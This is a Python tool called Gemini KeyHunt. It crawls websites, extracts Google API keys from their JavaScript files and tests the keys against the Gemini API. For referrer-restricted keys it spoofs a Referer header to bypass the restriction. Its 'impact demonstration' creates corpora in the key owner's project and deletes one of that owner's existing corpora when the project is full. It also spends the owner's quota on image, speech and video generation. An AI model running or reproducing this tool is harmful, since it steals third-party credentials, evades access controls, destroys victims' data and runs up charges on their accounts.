#!/usr/bin/env python3
"""
==============================================================================
  GEMINI KEYHUNT  -  Google / Gemini API Key Scanner & Impact Validator
  By: Mustafa - Hajus   |   Refactored / Hardened build
==============================================================================

WHAT IT DOES
------------
1. Takes one or many targets (domains / URLs), or one/many JS file URLs.
2. Crawls each target up to a chosen depth, discovers JavaScript files.
3. Uses a smart regex to extract Google API keys (AIza...).
4. For every unique key it runs Gemini validation:
       - LEAKED  (403 "reported as leaked")            -> flag & move on
       - REFERER BLOCKED (403 referrer)                -> retry w/ Referer bypass
       - VULNERABLE (200 generateContent works)        -> demonstrate impact
       - INVALID / OTHER                               -> report raw error
5. For VULNERABLE keys it DEMONSTRATES IMPACT:
       - Uploads a corpus (referer-bypass aware), verifies retrieval, cleans up.
       - If "Project has the maximum number of Corpora (10)" -> deletes one & retries.
       - Optionally verifies content generation by asking a question.
6. Optional capability testing (text / image / TTS / video) with evidence files.

USAGE
-----
Interactive menu:
    python3 gemini_keyhunt.py

Non-interactive (great for cron / VPS):
    python3 gemini_keyhunt.py --target https://example.com --depth 2
    python3 gemini_keyhunt.py --targets targets.txt --depth 1 --threads 20
    python3 gemini_keyhunt.py --js-file https://x.com/app.js
    python3 gemini_keyhunt.py --js-list jsurls.txt
    python3 gemini_keyhunt.py --validate-key AIza... 
    python3 gemini_keyhunt.py --validate-list keys.txt
    python3 gemini_keyhunt.py --capability AIza...

See README.txt for the full flag reference.
==============================================================================
"""

import argparse
import concurrent.futures
import hashlib
import json
import os
import re
import sys
import time
import wave
from datetime import datetime
from urllib.parse import urljoin, urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] Missing dependency. Run:  pip install requests")
    sys.exit(1)


# =============================================================================
#  COLORS / UI
# =============================================================================
class C:
    R = "\033[91m"   # red
    G = "\033[92m"   # green
    Y = "\033[93m"   # yellow
    B = "\033[94m"   # blue
    M = "\033[95m"   # magenta
    C = "\033[96m"   # cyan
    GR = "\033[90m"  # grey
    BOLD = "\033[1m"
    W = "\033[0m"    # reset


NO_COLOR = False


def col(text, color):
    if NO_COLOR:
        return text
    return f"{color}{text}{C.W}"


def log(msg, color=C.W):
    print(col(msg, color))


def banner():
    art = r"""
   ____ _  __  _  ___   ___   _   _ _   _ _   _ _____
  / ___| |/ / | |/ / | | \ \ / / | | | | | \ | | | |__   __|
 | |  _| ' /  | ' /| | | |\ V /  | |_| | |  \| | | |  | |
 | |_| | . \  | . \| |_| | | |   |  _  | | |\  | | |  | |
  \____|_|\_\ |_|\_\\___/  |_|   |_| |_|_|_| \_| |_|  |_|
"""
    print(col(art, C.M))
    print(col("        [ Google API Key Scanner  |  By: Mustafa - Hajus ]\n", C.GR))


def section(title):
    line = "=" * 78
    print(col(line, C.GR))
    print(col(f"  {title}", C.BOLD + C.W))
    print(col(line, C.GR))


def found_box(label, fields, color=C.G):
    print(col(f"\n{'-' * 26} {label} {'-' * 26}", color))
    for k, v in fields.items():
        print(f"  {col(k.ljust(8), C.W)}: {col(str(v), C.C)}")
    print(col("-" * (54 + len(label) + 2), color))


# =============================================================================
#  CONSTANTS
# =============================================================================
BASE = "https://generativelanguage.googleapis.com"

# Smart Google API key regex. AIza + 35 chars of [A-Za-z0-9_-].
# Negative lookbehind/ahead avoid grabbing keys glued to longer base64 blobs.
KEY_REGEX = re.compile(r"(?<![A-Za-z0-9_\-])AIza[0-9A-Za-z_\-]{35}(?![0-9A-Za-z_\-])")

# Referer-spoof header used to bypass HTTP-referrer-restricted keys.
BYPASS_REFERER = "https://www.google.com/"

DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"
)

# Models used for impact / capability checks (kept current & cheap-first).
TEXT_MODEL = "gemini-2.5-flash"
IMAGE_MODEL = "imagen-4.0-fast-generate-001"
TTS_MODEL = "gemini-2.5-flash-preview-tts"
VIDEO_MODEL = "veo-3.0-fast-generate-001"

EVIDENCE_ROOT = "gemini_evidence"
RESULTS_FILE = "results.txt"
REPORT_FILE = "report.json"

# Verdict labels
V_LEAKED = "LEAKED"
V_REFERER = "REFERER_BLOCKED"
V_VULN = "VULNERABLE"
V_VULN_BYPASS = "VULNERABLE_BYPASS"
V_INVALID = "INVALID"
V_UNKNOWN = "UNKNOWN"


# =============================================================================
#  HTTP SESSION (retries + pooling)
# =============================================================================
def make_session():
    s = requests.Session()
    retry = Retry(
        total=2,
        backoff_factor=0.4,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["GET", "POST", "DELETE"],
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({"User-Agent": DEFAULT_UA})
    return s


SESSION = make_session()


# =============================================================================
#  CRAWLER  /  JS DISCOVERY
# =============================================================================
SCRIPT_SRC_RE = re.compile(r"""<script[^>]+src=["']([^"']+)["']""", re.IGNORECASE)
HREF_RE = re.compile(r"""<a[^>]+href=["']([^"']+)["']""", re.IGNORECASE)
JS_IN_TEXT_RE = re.compile(r"""["'](/[^"']+?\.js[^"']*)["']""")


def normalize_target(t):
    t = t.strip()
    if not t:
        return None
    if not t.startswith(("http://", "https://")):
        t = "https://" + t
    return t


def same_host(a, b):
    try:
        return urlparse(a).netloc.split(":")[0].lower() == \
               urlparse(b).netloc.split(":")[0].lower()
    except Exception:
        return False


def fetch(url, timeout=15, headers=None):
    try:
        r = SESSION.get(url, timeout=timeout, headers=headers, allow_redirects=True)
        return r
    except requests.RequestException:
        return None


def discover_js_and_links(page_url, html):
    """Return (js_urls, page_links) discovered in an HTML page."""
    js = set()
    links = set()
    for m in SCRIPT_SRC_RE.findall(html):
        js.add(urljoin(page_url, m))
    for m in JS_IN_TEXT_RE.findall(html):
        js.add(urljoin(page_url, m))
    for m in HREF_RE.findall(html):
        full = urljoin(page_url, m)
        if full.startswith("http"):
            links.add(full.split("#")[0])
    return js, links


def crawl_target(target, depth=1, max_pages=80, verbose=True):
    """
    Crawl a single target up to `depth`, collecting JS file URLs (same host).
    Returns a set of JS URLs to scan.
    """
    start = normalize_target(target)
    if not start:
        return set()

    seen_pages = set()
    js_urls = set()
    # queue of (url, current_depth)
    queue = [(start, 0)]

    while queue and len(seen_pages) < max_pages:
        url, d = queue.pop(0)
        if url in seen_pages:
            continue
        seen_pages.add(url)

        r = fetch(url)
        if not r or r.status_code >= 400:
            continue

        ctype = r.headers.get("Content-Type", "")
        # If the URL itself is a JS file, queue it directly.
        if url.lower().endswith(".js") or "javascript" in ctype:
            js_urls.add(url)
            continue
        if "html" not in ctype and "<html" not in r.text[:2000].lower():
            continue

        found_js, links = discover_js_and_links(url, r.text)
        js_urls.update(found_js)

        if verbose and found_js:
            log(f"  [crawl] {url} -> {len(found_js)} js", C.GR)

        if d < depth:
            for link in links:
                if same_host(start, link) and link not in seen_pages:
                    queue.append((link, d + 1))

    return js_urls


# =============================================================================
#  KEY EXTRACTION
# =============================================================================
def extract_keys_from_text(text):
    return set(KEY_REGEX.findall(text or ""))


def scan_js_urls(js_urls, threads=15, verbose=True):
    """
    Fetch each JS url and extract keys.
    Returns list of dicts: {key, url, source}
    """
    results = []
    seen = set()
    lock_print = []

    def work(u):
        r = fetch(u, timeout=20)
        if not r or r.status_code >= 400:
            return (u, None, set())
        return (u, r.status_code, extract_keys_from_text(r.text))

    total = len(js_urls)
    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(work, u): u for u in js_urls}
        for fut in concurrent.futures.as_completed(futures):
            done += 1
            u, status, keys = fut.result()
            if verbose:
                pct = int(done * 100 / max(total, 1))
                sys.stdout.write(f"\r  Progress: {pct}%   ")
                sys.stdout.flush()
            for k in keys:
                if k in seen:
                    continue
                seen.add(k)
                entry = {"key": k, "url": u, "source": "JS File"}
                results.append(entry)
                lock_print.append(entry)
    if verbose:
        sys.stdout.write("\r" + " " * 30 + "\r")
    # Print discovered keys after progress finishes
    for e in lock_print:
        found_box("GOOGLE API KEY FOUND!", {
            "Key": e["key"],
            "URL": e["url"],
            "Source": e["source"],
        }, color=C.G)
    return results


# =============================================================================
#  VALIDATION  (the brain)
# =============================================================================
def _gen_content_request(api_key, prompt="ping", use_referer=False, model=TEXT_MODEL):
    url = f"{BASE}/v1beta/models/{model}:generateContent?key={api_key}"
    headers = {"Content-Type": "application/json"}
    if use_referer:
        headers["Referer"] = BYPASS_REFERER
    payload = {"contents": [{"parts": [{"text": prompt}]}]}
    try:
        r = SESSION.post(url, headers=headers, json=payload, timeout=25)
        return r
    except requests.RequestException as e:
        return None


def _parse_error(resp):
    """Return (code, status, message) from a Google error response."""
    try:
        j = resp.json()
        err = j.get("error", {})
        return err.get("code"), err.get("status"), err.get("message", "")
    except Exception:
        return resp.status_code if resp is not None else None, None, (resp.text if resp is not None else "")


def classify(resp):
    """Map a generateContent response to a verdict + details."""
    if resp is None:
        return V_UNKNOWN, {"detail": "No response / network error"}

    if resp.status_code == 200:
        return V_VULN, {"detail": "HTTP 200 - Gemini API accessible"}

    code, status, msg = _parse_error(resp)
    low = (msg or "").lower()

    if code == 403 and "leaked" in low:
        return V_LEAKED, {"code": code, "status": status, "message": msg}

    if code == 403 and ("referer" in low or "referrer" in low):
        return V_REFERER, {"code": code, "status": status, "message": msg}

    if code == 400 and "api key not valid" in low:
        return V_INVALID, {"code": code, "status": status, "message": msg}

    if code == 429:
        return V_INVALID, {"code": code, "status": status, "message": msg}

    if code == 403:
        # Generic permission denied (API disabled, etc.)
        return V_INVALID, {"code": code, "status": status, "message": msg}

    return V_UNKNOWN, {"code": code, "status": status, "message": msg}


def validate_key(api_key, verbose=True):
    """
    Full validation pipeline for a single key.
    Returns dict: {key, verdict, use_referer, detail, ...}
    """
    # First attempt: no referer
    r1 = _gen_content_request(api_key, prompt="ping", use_referer=False)
    verdict, det = classify(r1)

    if verdict == V_LEAKED:
        # Dead key. Show code/status/message only. Move on.
        if verbose:
            found_box("FLAGGED KEY (LEAKED)", {
                "Key": api_key,
                "Code": det.get("code"),
                "Status": det.get("status"),
                "Message": det.get("message"),
            }, color=C.R)
        return {"key": api_key, "verdict": V_LEAKED, "use_referer": False, **det}

    if verdict == V_VULN:
        if verbose:
            found_box("VULNERABLE KEY FOUND!", {
                "Key": api_key,
                "Status": "VULNERABLE",
                "Detail": "HTTP 200 - Gemini API accessible",
            }, color=C.R)
        return {"key": api_key, "verdict": V_VULN, "use_referer": False, **det}

    if verdict == V_REFERER:
        # Try the referer bypass.
        if verbose:
            log(f"  [~] {api_key[:14]}... referer-blocked, attempting bypass...", C.Y)
        r2 = _gen_content_request(api_key, prompt="ping", use_referer=True)
        v2, det2 = classify(r2)
        if v2 == V_VULN:
            if verbose:
                found_box("VULNERABLE! 403 BYPASSED!", {
                    "Key": api_key,
                    "Status": "403 BYPASSED -> HTTP 200",
                    "Detail": "HTTP 200 - Gemini API accessible via Referer Spoofing -> google.com",
                }, color=C.R)
            return {"key": api_key, "verdict": V_VULN_BYPASS, "use_referer": True,
                    "detail": "403 bypassed via Referer spoofing"}
        if v2 == V_LEAKED:
            if verbose:
                found_box("FLAGGED KEY (LEAKED)", {
                    "Key": api_key, "Code": det2.get("code"),
                    "Status": det2.get("status"), "Message": det2.get("message"),
                }, color=C.R)
            return {"key": api_key, "verdict": V_LEAKED, "use_referer": True, **det2}
        # Bypass failed
        if verbose:
            found_box("INVALID / RESTRICTED", {
                "Key": api_key, "Status": v2,
                "Message": det2.get("message", det2.get("detail", "")),
            }, color=C.Y)
        return {"key": api_key, "verdict": V_INVALID, "use_referer": True, **det2}

    # invalid / unknown
    if verbose:
        found_box("INVALID / OTHER", {
            "Key": api_key,
            "Status": verdict,
            "Message": det.get("message", det.get("detail", "")),
        }, color=C.Y)
    return {"key": api_key, "verdict": verdict, "use_referer": False, **det}


def validate_many(keys, threads=10, verbose=True):
    results = []
    total = len(keys)
    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(validate_key, k, verbose): k for k in keys}
        for fut in concurrent.futures.as_completed(futures):
            done += 1
            results.append(fut.result())
            if not verbose:
                pct = int(done * 100 / max(total, 1))
                sys.stdout.write(f"\r  Verifying: {pct}%   ")
                sys.stdout.flush()
    if not verbose:
        sys.stdout.write("\r" + " " * 30 + "\r")
    return results


# =============================================================================
#  IMPACT DEMONSTRATION  (corpora upload + verify + cleanup)
# =============================================================================
def _hdr(use_referer):
    h = {"Content-Type": "application/json"}
    if use_referer:
        h["Referer"] = BYPASS_REFERER
    return h


def list_corpora(api_key, use_referer):
    url = f"{BASE}/v1beta/corpora?key={api_key}"
    try:
        r = SESSION.get(url, headers=_hdr(use_referer), timeout=20)
        return r.json().get("corpora", []) if r.status_code == 200 else []
    except Exception:
        return []


def delete_corpus(api_key, corpus_name, use_referer):
    # corpus_name like "corpora/xxxx"; force=true removes documents inside it.
    url = f"{BASE}/v1beta/{corpus_name}?force=true&key={api_key}"
    try:
        r = SESSION.delete(url, headers=_hdr(use_referer), timeout=20)
        return r.status_code in (200, 204)
    except Exception:
        return False


def create_corpus(api_key, display_name, use_referer):
    url = f"{BASE}/v1beta/corpora?key={api_key}"
    payload = {"display_name": display_name}
    try:
        return SESSION.post(url, headers=_hdr(use_referer), json=payload, timeout=20)
    except requests.RequestException:
        return None


def get_corpus(api_key, corpus_name, use_referer):
    url = f"{BASE}/v1beta/{corpus_name}?key={api_key}"
    try:
        r = SESSION.get(url, headers=_hdr(use_referer), timeout=20)
        return r.json() if r.status_code == 200 else None
    except Exception:
        return None


def create_document(api_key, corpus_name, display_name, use_referer):
    """Create a document inside a corpus (the 'file' we upload)."""
    url = f"{BASE}/v1beta/{corpus_name}/documents?key={api_key}"
    payload = {"display_name": display_name}
    try:
        return SESSION.post(url, headers=_hdr(use_referer), json=payload, timeout=20)
    except requests.RequestException:
        return None


def upload_chunk(api_key, document_name, text, use_referer):
    """Upload actual content (a chunk) into a document = real data write."""
    url = f"{BASE}/v1beta/{document_name}/chunks?key={api_key}"
    payload = {"data": {"string_value": text}}
    try:
        return SESSION.post(url, headers=_hdr(use_referer), json=payload, timeout=20)
    except requests.RequestException:
        return None


def get_document(api_key, document_name, use_referer):
    url = f"{BASE}/v1beta/{document_name}?key={api_key}"
    try:
        r = SESSION.get(url, headers=_hdr(use_referer), timeout=20)
        return r.json() if r.status_code == 200 else None
    except Exception:
        return None


def list_chunks(api_key, document_name, use_referer):
    url = f"{BASE}/v1beta/{document_name}/chunks?key={api_key}"
    try:
        r = SESSION.get(url, headers=_hdr(use_referer), timeout=20)
        return r.json().get("chunks", []) if r.status_code == 200 else []
    except Exception:
        return []


def demonstrate_impact(api_key, use_referer, cleanup=True, verbose=True):
    """
    Proof-of-impact: create a corpus (write access), verify it can be retrieved,
    then clean it up. Handles the "max 10 corpora" case by deleting one & retrying.
    Returns a dict describing what happened.
    """
    out = {"corpus_created": False, "corpus_verified": False,
           "freed_slot": False, "corpus_name": None, "notes": []}

    display = "keyhunt-poc"
    if verbose:
        log("  [impact] Attempting corpus creation (write access PoC)...", C.C)

    r = create_corpus(api_key, display, use_referer)

    # Handle max corpora (10) -> delete one and retry once.
    if r is not None and r.status_code != 200:
        code, status, msg = _parse_error(r)
        if "maximum number of corpora" in (msg or "").lower():
            if verbose:
                log("  [impact] Project at max corpora (10). Freeing a slot...", C.Y)
            existing = list_corpora(api_key, use_referer)
            if existing:
                victim = existing[0]["name"]
                if delete_corpus(api_key, victim, use_referer):
                    out["freed_slot"] = True
                    out["notes"].append(f"deleted {victim} to free slot")
                    if verbose:
                        log(f"  [impact] Deleted {victim}. Retrying create...", C.Y)
                    r = create_corpus(api_key, display, use_referer)

    if r is not None and r.status_code == 200:
        body = r.json()
        name = body.get("name")
        out["corpus_created"] = True
        out["corpus_name"] = name
        if verbose:
            log(f"  [impact] Corpus created: {name}", C.G)

        # Verify by retrieving it back.
        got = get_corpus(api_key, name, use_referer)
        if got and got.get("name") == name:
            out["corpus_verified"] = True
            if verbose:
                log(f"  [impact] Verified retrieval of {name}", C.G)

        # Cleanup our PoC artifact so we don't pollute the project.
        if cleanup and name:
            if delete_corpus(api_key, name, use_referer):
                out["notes"].append("cleaned up PoC corpus")
                if verbose:
                    log("  [impact] Cleaned up PoC corpus.", C.GR)
    else:
        code, status, msg = _parse_error(r) if r is not None else (None, None, "no response")
        out["notes"].append(f"create failed: {status} {msg}")
        if verbose:
            log(f"  [impact] Corpus create failed: {status} - {msg}", C.Y)

    return out


def verify_generation(api_key, use_referer, question="Reply with the single word: OK", verbose=True):
    """Quick content-generation proof. Returns sample text or None."""
    r = _gen_content_request(api_key, prompt=question, use_referer=use_referer)
    if r is not None and r.status_code == 200:
        try:
            txt = r.json()["candidates"][0]["content"]["parts"][0]["text"]
            if verbose:
                log(f"  [impact] generateContent OK -> {txt.strip()[:60]}", C.G)
            return txt.strip()
        except Exception:
            return ""
    return None


# =============================================================================
#  CAPABILITY TESTING (text / image / tts / video)  + impact estimate
# =============================================================================
def _evidence_dir(api_key):
    kid = hashlib.sha256(api_key.encode()).hexdigest()[:7]
    d = os.path.join(EVIDENCE_ROOT, kid)
    os.makedirs(d, exist_ok=True)
    return d, kid


def _save_wave(path, pcm_bytes, rate=24000):
    with wave.open(path, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(rate)
        wf.writeframes(pcm_bytes)


def capability_test(api_key, use_referer=False, verbose=True):
    headers = _hdr(use_referer)
    ev_dir, kid = _evidence_dir(api_key)
    results = {"text": False, "image": False, "tts_single": False,
              "tts_multi": False, "video": False, "evidence": ev_dir}

    section(f"CAPABILITY TESTING  ->  {api_key[:9]}...{api_key[-4:]}")
    log(f"[i] Evidence directory : {ev_dir}", C.C)

    # --- Text ---
    log(f"[i] Testing text generation ({TEXT_MODEL})...", C.C)
    r = _gen_content_request(api_key, "Say hello in 3 words.", use_referer)
    if r is not None and r.status_code == 200:
        results["text"] = True
        try:
            txt = r.json()["candidates"][0]["content"]["parts"][0]["text"]
            with open(os.path.join(ev_dir, "text.txt"), "w") as f:
                f.write(txt)
        except Exception:
            pass
        log("[/] Text generation  : OK", C.G)
    else:
        log("[-] Text generation  : Failed", C.R)

    # --- Image (Imagen) ---
    log(f"[i] Testing image generation ({IMAGE_MODEL})...", C.C)
    try:
        iurl = f"{BASE}/v1beta/models/{IMAGE_MODEL}:predict?key={api_key}"
        ipayload = {"instances": [{"prompt": "a single red apple on white"}],
                    "parameters": {"sampleCount": 1}}
        ir = SESSION.post(iurl, headers=headers, json=ipayload, timeout=60)
        if ir.status_code == 200 and "predictions" in ir.json():
            results["image"] = True
            try:
                import base64
                b64 = ir.json()["predictions"][0].get("bytesBase64Encoded")
                if b64:
                    with open(os.path.join(ev_dir, "image.png"), "wb") as f:
                        f.write(base64.b64decode(b64))
            except Exception:
                pass
            log("[/] Image generation : OK", C.G)
        else:
            log("[-] Image generation : Failed / Not supported", C.Y)
    except Exception:
        log("[-] Image generation : Failed / Not supported", C.Y)

    # --- TTS single speaker ---
    log(f"[i] Testing TTS - single speaker ({TTS_MODEL})...", C.C)
    try:
        turl = f"{BASE}/v1beta/models/{TTS_MODEL}:generateContent?key={api_key}"
        tpayload = {
            "contents": [{"parts": [{"text": "Hello from keyhunt."}]}],
            "generationConfig": {
                "responseModalities": ["AUDIO"],
                "speechConfig": {
                    "voiceConfig": {"prebuiltVoiceConfig": {"voiceName": "Kore"}}
                },
            },
        }
        tr = SESSION.post(turl, headers=headers, json=tpayload, timeout=60)
        if tr.status_code == 200:
            import base64
            data = tr.json()["candidates"][0]["content"]["parts"][0]["inlineData"]["data"]
            pcm = base64.b64decode(data)
            wav_path = os.path.join(ev_dir, "single_speaker.wav")
            _save_wave(wav_path, pcm)
            results["tts_single"] = True
            log(f"[/] TTS single saved : {wav_path}", C.G)
        else:
            log("[-] TTS single       : Failed / Not supported", C.Y)
    except Exception:
        log("[-] TTS single       : Failed / Not supported", C.Y)

    # --- Video (Veo) - long-running, just probe ---
    log(f"[i] Testing video generation ({VIDEO_MODEL})...", C.C)
    try:
        vurl = f"{BASE}/v1beta/models/{VIDEO_MODEL}:predictLongRunning?key={api_key}"
        vpayload = {"instances": [{"prompt": "a calm ocean wave, 5 seconds"}]}
        vr = SESSION.post(vurl, headers=headers, json=vpayload, timeout=30)
        if vr.status_code == 200 and "name" in vr.json():
            results["video"] = True
            log("[/] Video generation : Accepted (operation started)", C.G)
        else:
            log("[-] Video generation : Failed / Not supported", C.Y)
    except Exception:
        log("[-] Video generation : Failed / Not supported", C.Y)

    _print_impact_estimate(results)
    return results


def _print_impact_estimate(results):
    print()
    section("IMPACT ESTIMATE (Illustrative)")
    rows = [("Capability", "Unit", "Cost", "Notes")]
    if results["text"]:
        rows.append(("Text", "~50 tokens", "~$0.00002", "Gemini 2.5 Flash"))
    if results["tts_single"]:
        rows.append(("Audio (single)", "~2 sec", "~$0.00064", "TTS Flash"))
    if results["image"]:
        rows.append(("Image", "1 img", "~$0.02", "Imagen 4 Fast"))
    if results["video"]:
        rows.append(("Video", "5 sec", "~$0.40", "Veo 3 Fast"))
    w = [16, 14, 12, 22]
    for i, row in enumerate(rows):
        line = " | ".join(str(c).ljust(w[j]) for j, c in enumerate(row))
        print(col(line, C.W if i else C.GR))
        if i == 0:
            print(col("-+-".join("-" * x for x in w), C.GR))


# =============================================================================
#  REPORTING / OUTPUT
# =============================================================================
def save_results(found_keys, validations=None):
    with open(RESULTS_FILE, "w") as f:
        for e in found_keys:
            f.write(f"{e['key']} | {e.get('url','')} | {e.get('source','')}\n")
    log(f"[/] Keys saved -> {RESULTS_FILE}", C.G)

    if validations is not None:
        report = {
            "generated": datetime.utcnow().isoformat() + "Z",
            "found": found_keys,
            "validations": validations,
        }
        with open(REPORT_FILE, "w") as f:
            json.dump(report, f, indent=2)
        log(f"[/] Report saved -> {REPORT_FILE}", C.G)


def scan_summary(urls_scanned, js_count, keys_found, errors):
    print()
    section("SCAN SUMMARY")
    print(f"  URLs Scanned  : {urls_scanned}")
    print(f"  JS Files      : {js_count}")
    print(f"  API Keys Found: {col(str(keys_found), C.G)}")
    print(f"  Errors        : {col(str(errors), C.R)}")
    print(col("=" * 78, C.GR))


def verify_summary(validations):
    print()
    section("VERIFY SUMMARY")
    total = len(validations)
    vuln = sum(1 for v in validations if v["verdict"] in (V_VULN, V_VULN_BYPASS))
    leaked = sum(1 for v in validations if v["verdict"] == V_LEAKED)
    other = total - vuln - leaked
    print(f"  Total Checked : {total}")
    print(f"  Vulnerable    : {col(str(vuln), C.R)}")
    print(f"  Leaked/Dead   : {col(str(leaked), C.Y)}")
    print(f"  Invalid/Other : {other}")
    print(col("=" * 78, C.GR))


# =============================================================================
#  HIGH-LEVEL FLOWS
# =============================================================================
def flow_scan_targets(targets, depth, threads, do_validate=True, do_impact=True):
    all_js = set()
    errors = 0
    for t in targets:
        log(f"\n[i] Crawling target: {t} (depth={depth})", C.C)
        try:
            js = crawl_target(t, depth=depth, verbose=True)
            all_js.update(js)
        except Exception as e:
            errors += 1
            log(f"  [!] Crawl error on {t}: {e}", C.R)

    log(f"\n[i] Total JS files discovered: {len(all_js)}", C.C)
    found = scan_js_urls(all_js, threads=threads)
    save_results(found)
    log(f"[/] {len(found)} API key(s) found and saved!", C.G)
    scan_summary(len(all_js), len(all_js), len(found), errors)

    if found and do_validate:
        proceed = _ask("\nDo you want to verify all keys now? (yes/no): ")
        if proceed:
            run_validation_and_impact([e["key"] for e in found], threads, do_impact, found)


def flow_scan_js_list(js_urls, threads, do_validate=True, do_impact=True):
    js_set = set(normalize_target(u) for u in js_urls if u.strip())
    found = scan_js_urls(js_set, threads=threads)
    save_results(found)
    log(f"[/] {len(found)} API key(s) found and saved!", C.G)
    scan_summary(len(js_set), len(js_set), len(found), 0)

    if found and do_validate:
        proceed = _ask("\nDo you want to verify all keys now? (yes/no): ")
        if proceed:
            run_validation_and_impact([e["key"] for e in found], threads, do_impact, found)


def run_validation_and_impact(keys, threads, do_impact, found_keys=None):
    section("API KEY VALIDATION")
    validations = validate_many(keys, threads=threads, verbose=True)

    # For vulnerable keys, demonstrate impact.
    if do_impact:
        for v in validations:
            if v["verdict"] in (V_VULN, V_VULN_BYPASS):
                use_ref = v.get("use_referer", False)
                section(f"IMPACT  ->  {v['key'][:9]}...{v['key'][-4:]}")
                v["impact"] = demonstrate_impact(v["key"], use_ref, verbose=True)
                v["generation_sample"] = verify_generation(v["key"], use_ref, verbose=True)

    verify_summary(validations)
    save_results(found_keys or [{"key": k} for k in keys], validations)
    return validations


# =============================================================================
#  INPUT HELPERS
# =============================================================================
def read_lines(path):
    try:
        with open(path, "r", errors="ignore") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except FileNotFoundError:
        log(f"[!] File not found: {path}", C.R)
        return []


def _ask(prompt):
    try:
        ans = input(col(prompt, C.Y)).strip().lower()
        return ans in ("y", "yes")
    except (EOFError, KeyboardInterrupt):
        return False


def _input(prompt):
    try:
        return input(col(prompt, C.Y)).strip()
    except (EOFError, KeyboardInterrupt):
        return ""


# =============================================================================
#  INTERACTIVE MENU
# =============================================================================
def menu():
    banner()
    while True:
        section("GOOGLE API KEY SCANNER")
        print(f"  {col('[1]', C.G)} Single Target Scan      # Scan a single domain or URL")
        print(f"  {col('[2]', C.G)} Batch Scan (File)       # Scan multiple targets from a file")
        print(f"  {col('[3]', C.G)} JS File Scanner         # Scan JS file URLs from a file")
        print(f"  {col('[4]', C.G)} API Key Validation      # Validate and test API keys")
        print(f"  {col('[5]', C.G)} Capability Testing      # Test what a Gemini key can generate")
        print(f"  {col('[6]', C.R)} Exit")
        choice = _input("\n  Select an option: ")

        if choice == "1":
            t = _input("  Target (domain/url): ")
            d = _input("  Crawl depth [1]: ") or "1"
            if t:
                flow_scan_targets([t], int(d), threads=15)
        elif choice == "2":
            p = _input("  Path to targets file: ")
            d = _input("  Crawl depth [1]: ") or "1"
            targets = read_lines(p)
            if targets:
                flow_scan_targets(targets, int(d), threads=20)
        elif choice == "3":
            p = _input("  Path to JS URL list file: ")
            urls = read_lines(p)
            if urls:
                flow_scan_js_list(urls, threads=20)
        elif choice == "4":
            sub = _input("  (1) single key  (2) key list file: ")
            if sub == "1":
                k = _input("  API key: ")
                if k:
                    run_validation_and_impact([k], threads=5, do_impact=True)
            elif sub == "2":
                p = _input("  Path to keys file: ")
                keys = read_lines(p)
                if keys:
                    run_validation_and_impact(keys, threads=10, do_impact=True)
        elif choice == "5":
            k = _input("  API key: ")
            if k:
                # auto-detect referer need
                v = validate_key(k, verbose=False)
                capability_test(k, use_referer=v.get("use_referer", False))
        elif choice == "6" or choice.lower() == "x":
            log("\n[i] Bye.\n", C.C)
            break
        else:
            log("  [!] Invalid option.", C.R)


# =============================================================================
#  CLI
# =============================================================================
def build_parser():
    p = argparse.ArgumentParser(
        description="Gemini KeyHunt - Google API key scanner & impact validator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    src = p.add_argument_group("targets / sources")
    src.add_argument("--target", help="Single domain or URL to crawl & scan")
    src.add_argument("--targets", help="File with one target per line")
    src.add_argument("--js-file", help="Single JS file URL to scan")
    src.add_argument("--js-list", help="File with one JS URL per line")
    src.add_argument("--validate-key", help="Validate a single API key (no crawling)")
    src.add_argument("--validate-list", help="File with one API key per line")
    src.add_argument("--capability", help="Run capability testing on a single key")

    opt = p.add_argument_group("options")
    opt.add_argument("--depth", type=int, default=1, help="Crawl depth (default 1)")
    opt.add_argument("--threads", type=int, default=15, help="Concurrency (default 15)")
    opt.add_argument("--no-validate", action="store_true",
                     help="Only find keys, do not validate")
    opt.add_argument("--no-impact", action="store_true",
                     help="Validate but skip impact demonstration")
    opt.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    opt.add_argument("--yes", action="store_true",
                     help="Assume yes to prompts (non-interactive / cron)")
    return p


def main():
    global NO_COLOR
    parser = build_parser()
    args = parser.parse_args()
    NO_COLOR = args.no_color

    do_validate = not args.no_validate
    do_impact = not args.no_impact

    # If no source flag is given, drop into interactive menu.
    has_source = any([args.target, args.targets, args.js_file, args.js_list,
                      args.validate_key, args.validate_list, args.capability])
    if not has_source:
        menu()
        return

    banner()

    # Patch the prompt for non-interactive runs.
    if args.yes:
        globals()["_ask"] = lambda prompt: True

    if args.capability:
        v = validate_key(args.capability, verbose=False)
        capability_test(args.capability, use_referer=v.get("use_referer", False))
        return

    if args.validate_key:
        run_validation_and_impact([args.validate_key], args.threads, do_impact)
        return

    if args.validate_list:
        keys = read_lines(args.validate_list)
        if keys:
            run_validation_and_impact(keys, args.threads, do_impact)
        return

    if args.js_file:
        flow_scan_js_list([args.js_file], args.threads, do_validate, do_impact)
        return

    if args.js_list:
        urls = read_lines(args.js_list)
        if urls:
            flow_scan_js_list(urls, args.threads, do_validate, do_impact)
        return

    targets = []
    if args.target:
        targets.append(args.target)
    if args.targets:
        targets.extend(read_lines(args.targets))
    if targets:
        flow_scan_targets(targets, args.depth, args.threads, do_validate, do_impact)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[i] Interrupted.")
        sys.exit(0)
